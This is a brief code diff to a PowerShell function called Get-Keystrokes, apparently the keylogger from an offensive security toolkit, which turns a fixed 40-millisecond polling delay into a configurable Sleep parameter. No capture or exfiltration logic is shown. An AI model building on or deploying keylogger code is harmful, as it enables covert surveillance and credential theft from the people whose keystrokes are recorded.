@@ -16,6 +16,12 @@ function Get-Keystrokes {
     http://www.obscuresec.com/
     http://www.exploit-monday.com/
 #>
+    param
+    (
+        [Parameter(Mandatory = $False)]
+        [string]
+        $Sleep = 1
+    )
 
     [Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms') | Out-Null
 
@@ -107,7 +113,7 @@ function Get-Keystrokes {
     $LastWindowTitle = ""
 
     while ($true) {
-        Start-Sleep -Milliseconds 40
+        Start-Sleep -Milliseconds $Sleep
         $gotit = ""
         $Outout = ""
 
